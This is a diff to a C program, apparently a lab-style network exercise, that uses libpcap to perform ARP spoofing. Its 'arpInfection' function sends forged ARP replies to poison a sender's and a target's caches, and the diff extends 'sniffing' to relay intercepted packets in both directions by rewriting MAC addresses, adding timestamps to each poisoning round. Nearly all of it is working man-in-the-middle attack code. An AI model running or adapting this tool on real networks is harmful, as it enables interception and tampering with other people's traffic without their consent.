@@ -3,6 +3,7 @@
 #include <stdint.h>
 #include <string.h>
 #include <unistd.h>
+#include <time.h>
 
 #include <pcap.h>             // pcap_open_live
 #include <arpa/inet.h>        // htol and_so_on
@@ -95,7 +96,7 @@ int main(int argc, char* argv[]){
     return -1;
   }
   printf("My Mac Address: %s\n", my_buf);
-  sscanf(my_buf, "%x:%x:%x:%x:%x:%x", &my_mac_addr[0], &my_mac_addr[1], &my_mac_addr[2], &my_mac_addr[3], &my_mac_addr[4], &my_mac_addr[5]);
+  sscanf(my_buf, "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx", &my_mac_addr[0], &my_mac_addr[1], &my_mac_addr[2], &my_mac_addr[3], &my_mac_addr[4], &my_mac_addr[5]);
 
   for(int i=0;i<todo;i++){
     char* send_ip   = argv[(i+1)*2];
@@ -118,12 +119,6 @@ int main(int argc, char* argv[]){
       target_ip_addr[i],
       target_mac_addr[i]);
   }
-/*
-  u_char* user=0;
-	if (pcap_loop(handle, -1, sniffing, user) == -1){
-		printf("pcap_loop ERROR\n");
-		return -1;
-	}*/
 
 u_char* user=0;
   while(1) {
@@ -133,11 +128,8 @@ u_char* user=0;
     if (res == 0) continue;
     else if (res == -1 || res == -2) break;
 
-    if(sniffing(user,header,packet) != 1) break;
-
+    if(sniffing(user,header,(uint8_t *)packet) != 1) break;
   }
-
-
 
   return 0;
 }
@@ -244,6 +236,7 @@ int getVictimMacAddr(uint8_t *arp_packet,
   uint8_t* victim_mac_addr,
   char c){
   printf("------------------------\n");
+
   createArpPacket(arp_packet,
       ARPOP_REQUEST,
       my_mac_addr, brdcst_mac_addr,
@@ -258,10 +251,9 @@ int getVictimMacAddr(uint8_t *arp_packet,
 
   struct pcap_pkthdr *header;
   const uint8_t *packet;
-  int res = pcap_next_ex(handle, &header, &packet);
+	int res = pcap_next_ex(handle, &header, &packet);
   while(1) {
-
-    res = pcap_next_ex(handle, &header, &packet);
+		res = pcap_next_ex(handle, &header, &packet);
     if (res == 0) continue;
     else if (res == -1 || res == -2) break;
 
@@ -308,7 +300,7 @@ int arpInfection(uint8_t *packet,
   }
 
   //to target
-  printf(">> To Target\n");
+  printf(">> To Target\t");
   createArpPacket(packet,
     ARPOP_REPLY,
     my_mac_addr, target_mac_addr,
@@ -319,6 +311,14 @@ int arpInfection(uint8_t *packet,
       printf("Request ARP ERROR");
       return -1;
   }
+
+	time_t t = time(NULL);
+  struct tm tm = *localtime(&t);
+
+  printf("%d-%d-%d %d:%d:%d\n",
+         tm.tm_year+1900, tm.tm_mon+1, tm.tm_mday,
+         tm.tm_hour, tm.tm_min, tm.tm_sec);
+
   return 0;
 }
 
@@ -326,15 +326,6 @@ int sniffing(u_char* user,const struct pcap_pkthdr *header,uint8_t *packet){
   struct libnet_ethernet_hdr* packet_eth = (struct libnet_ethernet_hdr*)packet;
   struct libnet_arp_hdr* packet_arp_h = (struct libnet_arp_hdr*)(packet_eth+1);
   struct arp_adr * packet_arp_a = (struct arp_adr*)(packet_arp_h+1);
-/*
-  for(int j=0;j<ETHER_ADDR_LEN;j++)
-    printf("%s%02X", (j>0 ? ":" : ""), packet_eth ->ether_shost[j]);
-  printf("\t\t");
-
-  for(int j=0;j<ETHER_ADDR_LEN;j++)
-    printf("%s%02X", (j>0 ? ":" : ""), packet_eth ->ether_dhost[j]);
-  printf("\n");
-*/
 
 
   for(int i=0; i<todo;i++){
@@ -358,16 +349,21 @@ int sniffing(u_char* user,const struct pcap_pkthdr *header,uint8_t *packet){
     }
 
     //relaying
-    if(!memcmp(packet_eth -> ether_shost,send_mac_addr[i],6) && !memcmp(packet_arp_a->ar_tpa,target_ip_addr,4)){
-      memcpy(packet_eth->ether_shost,my_mac_addr,6);
-      memcpy(packet_eth->ether_dhost,target_mac_addr,6);
+    if(!memcmp(packet_eth -> ether_shost,send_mac_addr[i],ETHER_ADDR_LEN) && !memcmp(packet_arp_a->ar_tpa,&target_ip_addr[i],IP_ADDR_LEN)){
+      memcpy(packet_eth->ether_shost,my_mac_addr,ETHER_ADDR_LEN);
+      memcpy(packet_eth->ether_dhost,target_mac_addr[i],ETHER_ADDR_LEN);
       if(pcap_inject(handle, packet, ARP_PACKET_LEN) == -1){
         printf("Relaying ERROR");
         return -1;
-      } else printf("Success Relaying\n");
-
-    }
-
+      } else printf("Success Relaying to Target\n");
+    } else if(!memcmp(packet_eth -> ether_shost,target_mac_addr[i],ETHER_ADDR_LEN) && !memcmp(packet_arp_a->ar_tpa,&send_ip_addr[i],IP_ADDR_LEN)){
+			memcpy(packet_eth->ether_shost,my_mac_addr,ETHER_ADDR_LEN);
+      memcpy(packet_eth->ether_dhost,send_mac_addr[i],ETHER_ADDR_LEN);
+      if(pcap_inject(handle, packet, ARP_PACKET_LEN) == -1){
+        printf("Relaying ERROR");
+        return -1;
+      } else printf("Success Relaying to Sender\n");
+		}
   }
   return 1;
 }
